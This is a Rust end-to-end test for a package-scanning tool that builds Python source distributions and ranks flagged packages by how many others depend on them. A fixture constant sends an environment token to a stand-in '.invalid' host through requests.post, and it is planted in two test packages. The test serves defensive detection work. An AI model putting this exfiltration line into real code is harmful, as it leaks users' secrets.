//! End-to-end contract of `phylaxis project` (T-17, ADR-027): a dependency set of sdists is
//! scanned, its graph built from each `PKG-INFO`, and flagged packages ranked by how much of
//! the set depends on them. The set is built at test time; payloads are inert (`.invalid`
//! hosts, a base64 blob that decodes to a `print`).

use std::fs::File;
use std::path::{Path, PathBuf};

use phylaxis_cli::project::{project_report, sdists_in};
use phylaxis_core::ScanOptions;

fn sdist(dir: &Path, name: &str, requires: &[&str], init: &str) -> PathBuf {
    let path = dir.join(format!("{name}-1.0.tar.gz"));
    let gz =
        flate2::write::GzEncoder::new(File::create(&path).unwrap(), flate2::Compression::default());
    let mut b = tar::Builder::new(gz);
    let mut pkg_info = format!("Metadata-Version: 2.1\nName: {name}\nVersion: 1.0\n");
    for r in requires {
        pkg_info.push_str(&format!("Requires-Dist: {r}\n"));
    }
    let module = name.replace('-', "_");
    let setup = format!(
        "from setuptools import setup\nsetup(name='{name}', version='1.0', packages=['{module}'])\n"
    );
    for (rel, body) in [
        (format!("{name}-1.0/PKG-INFO"), pkg_info),
        (format!("{name}-1.0/setup.py"), setup),
        (format!("{name}-1.0/{module}/__init__.py"), init.to_owned()),
    ] {
        let mut h = tar::Header::new_gnu();
        h.set_size(body.len() as u64);
        h.set_mode(0o644);
        h.set_cksum();
        b.append_data(&mut h, rel, body.as_bytes()).unwrap();
    }
    b.into_inner().unwrap().finish().unwrap();
    path
}

const CLEAN: &str = "def hello():\n    return 'hi'\n";
const EXFIL: &str =
    "import os, requests\nrequests.post('https://c.example.invalid/', data=os.environ['TOKEN'])\n";

#[test]
fn flagged_packages_are_ranked_by_how_much_of_the_set_depends_on_them() {
    let dir = std::env::temp_dir().join(format!("phylaxis-project-test-{}", std::process::id()));
    let _ = std::fs::remove_dir_all(&dir);
    std::fs::create_dir_all(&dir).unwrap();
    // app → web → core-lib (malicious, two dependents); app → cli; typo-pkg (malicious, leaf).
    sdist(&dir, "app", &["web>=1", "cli"], CLEAN);
    sdist(&dir, "web", &["core-lib", "not-in-the-set"], CLEAN);
    sdist(&dir, "cli", &["colorama; extra == \"color\""], CLEAN);
    sdist(&dir, "core-lib", &[], EXFIL);
    sdist(&dir, "typo-pkg", &[], EXFIL);

    let paths = sdists_in(&dir).unwrap();
    assert_eq!(paths.len(), 5);
    let r = project_report(&paths, &ScanOptions::default());
    let _ = std::fs::remove_dir_all(&dir);

    assert_eq!(r.dependency_edges, 3, "app→web, app→cli, web→core-lib");
    assert!(
        r.packages
            .iter()
            .all(|p| p.dependencies_known && p.problem.is_none())
    );
    let order: Vec<_> = r
        .ranked
        .iter()
        .map(|f| (f.name.as_str(), f.blast_radius.transitive_dependents))
        .collect();
    assert_eq!(order, vec![("core-lib", 2), ("typo-pkg", 0)]);
    assert_eq!(r.ranked[0].blast_radius.direct_dependents, 1);
    assert!(
        (r.ranked[0].blast_radius.share - 0.5).abs() < 1e-12,
        "2 of the 4 other packages"
    );
}
